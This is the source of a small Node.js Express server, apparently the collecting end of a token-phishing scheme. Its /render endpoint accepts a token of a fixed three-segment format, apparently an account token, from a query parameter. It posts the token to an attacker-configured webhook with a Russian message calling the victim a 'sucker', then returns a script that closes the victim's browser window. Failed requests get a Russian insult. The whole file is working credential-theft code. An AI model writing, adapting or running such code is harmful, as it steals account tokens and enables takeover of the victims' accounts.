const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const webhook = process.env.webhook || "example.com";

app.get('/render', async (req,res) => {
    if (!req.query) {  res.send('я твою матушку в кино водил и сладкой ватой угощал') }
    if (!req.query.xyz) {  res.send('я твою матушку в кино водил и сладкой ватой угощал') }

    const token = req.query.xyz
    if (!token) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
    const segments = token.split(".")
    if (!segments) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }

    if (segments.length < 3) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }

    if (segments[0].length != 26) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
    if (segments[1].length != 6) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
    if (segments[2].length != 38) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }

    const content = '@everyone Новый лох! \n ```' + token + '```'

    const response = await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
    })

    res.send(`
    <script>
        window.close()
    </script>    
        `) 
})

app.listen(port)
